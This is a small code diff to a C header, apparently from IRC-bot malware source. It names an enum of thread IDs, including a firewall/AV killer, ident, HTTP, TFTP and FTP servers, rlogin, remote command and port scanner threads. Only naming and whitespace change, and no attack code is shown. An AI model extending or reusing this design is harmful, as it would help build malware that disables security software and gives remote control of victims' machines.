@@ -3,13 +3,13 @@
 #include "define.h"
 #include "includes.h"
 
-enum {
+enum ThreadID  {
 	MAIN_THREAD,		// Main thread 
 	KILLER_THREAD,		// Firewall/AV Killer thread
 	IDENT_THREAD,		// Ident Server thread
 	HTTP_THREAD,		// HTTP Server thread
 	TFTP_THREAD,		// TFTP Server thread
-	FTP_THREAD,		// FTP Server thread
+	FTP_THREAD,			// FTP Server thread
 	RLOGIN_THREAD,		// Rlogin Server thread
 	RCMD_THREAD,		// Remote CMD thread
 	SCAN_THREAD,		// Port Scanner thread
